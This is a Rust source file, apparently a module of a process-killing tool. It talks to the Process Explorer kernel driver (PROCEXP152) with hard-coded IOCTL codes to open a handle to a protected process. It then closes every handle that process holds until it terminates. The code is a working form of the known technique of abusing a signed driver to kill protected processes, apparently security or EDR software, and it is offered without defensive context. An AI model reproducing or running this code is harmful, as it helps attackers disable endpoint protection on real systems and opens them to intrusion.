use crate::win32;
use crate::win32::NTAdresses;
use crate::DriverBuilder;
use core::ffi::c_void;
use std::{thread, time};
use windows::Win32::System::IO::DeviceIoControl;
use windows::Win32::{Foundation::HANDLE, System::Threading::GetExitCodeProcess};

#[repr(C)]
struct ProcExpDataExchange {
    ul_pid: u64,
    lp_object_address: *mut c_void,
    ul_size: u64,
    ul_handle: u64,
}

impl ProcExpDataExchange {
    pub fn new(
        ul_pid: u64,
        lp_object_address: *mut c_void,
        ul_size: u64,
        ul_handle: u64,
    ) -> ProcExpDataExchange {
        ProcExpDataExchange {
            ul_pid,
            lp_object_address,
            ul_size,
            ul_handle,
        }
    }
}

pub struct ProcExp {
    device: HANDLE,
    handle_protected_process: HANDLE,
    pid: u32,
    nt_functions: NTAdresses,
}

impl DriverBuilder for ProcExp {
    fn build(pid: u32) -> Result<Box<dyn DriverBuilder>, String> {
        let nt_functions = NTAdresses::build()?;

        let device = win32::connect_to_device("\\\\.\\PROCEXP152")?;

        let handle_protected_process = ProcExp::open_protected_process(pid.into(), device)?;

        return Ok(Box::new(ProcExp {
            device,
            handle_protected_process,
            pid,
            nt_functions,
        }));
    }

    fn kill(&self) -> Result<(), String> {
        ProcExp::kill_process_handles(
            self.handle_protected_process,
            self.pid,
            self.nt_functions,
            self.device,
        )?;

        return Ok(());
    }
}

impl ProcExp {
    fn kill_process_handles(
        hprocess: HANDLE,
        pid: u32,
        addresses: NTAdresses,
        device: HANDLE,
    ) -> Result<(), &'static str> {
        let handle_table_information = win32::get_handle_information_table(&addresses)?;

        let table_information;
        match unsafe { handle_table_information.as_ref() } {
            Some(n) => table_information = n,
            None => return Err("Could not cast table_information to reference"),
        }
        let mut table_information_handles_ptr = table_information.handles.as_ptr();
        let num_handles = table_information.number_of_handles;

        for _ in 0..num_handles {
            let handle_info = unsafe { *table_information_handles_ptr };
            if handle_info.processid == pid {
                if let Err(e) = ProcExp::kill_handle(pid, handle_info.handle, &addresses, device) {
                    println!("Could not kill handle: {}", e);
                }
            }
            table_information_handles_ptr = unsafe { table_information_handles_ptr.add(1) };
        }

        let mut dwprocstatus: u32 = 0;
        unsafe { _ = GetExitCodeProcess(hprocess, &mut dwprocstatus) };
        if dwprocstatus != 259 {
            //259 == NTSTATUS STILL_ACTIVE
            return Ok(());
        }

        println!("Process is still alive. Sleeping 5 seconds");
        thread::sleep(time::Duration::from_millis(5000));

        unsafe { _ = GetExitCodeProcess(hprocess, &mut dwprocstatus) };
        if dwprocstatus != 259 {
            //259 == NTSTATUS STILL_ACTIVE
            return Ok(());
        }

        return Err("Could not kill process");
    }

    fn kill_handle(
        pid: u32,
        handle: u16,
        addresses: &NTAdresses,
        device: HANDLE,
    ) -> Result<(), &'static str> {
        let object_addr_to_close = win32::get_object_address_from_handle(pid, handle, addresses)?;

        let mut dw_bytes_returned: u32 = 0;
        let ctrl = ProcExpDataExchange::new(pid as u64, object_addr_to_close, 0, handle as u64);
        const IOCTL_CLOSE_HANDLE: u32 = 2201288708;

        unsafe {
            if let Err(_) = DeviceIoControl(
                device,
                IOCTL_CLOSE_HANDLE,
                Some(&ctrl as *const _ as *const c_void),
                std::mem::size_of::<ProcExpDataExchange>() as u32,
                None,
                0,
                Some(&mut dw_bytes_returned),
                None,
            ) {
                return Err("Could not close handle");
            }
        }
        Ok(())
    }

    fn open_protected_process(pid: u64, device: HANDLE) -> Result<HANDLE, &'static str> {
        let mut h_protected_process = HANDLE::default();
        let mut dw_bytes_returned: u32 = 0;

        unsafe {
            const IOCTL_OPEN_PROTECTED_PROCESS_HANDLE: u32 = 2201288764;
            if let Err(_) = DeviceIoControl(
                device,
                IOCTL_OPEN_PROTECTED_PROCESS_HANDLE,
                Some(&pid as *const _ as *const c_void),
                std::mem::size_of::<u64>() as u32,
                Some(&mut h_protected_process as *mut _ as *mut c_void),
                std::mem::size_of::<HANDLE>() as u32,
                Some(&mut dw_bytes_returned),
                None,
            ) {
                return Err("Could not get handle of protected process");
            }
        };

        if dw_bytes_returned == 0 {
            return Err("Could not get handle of protected process. dw_bytes_returned returned 0");
        }

        return Ok(h_protected_process);
    }
}
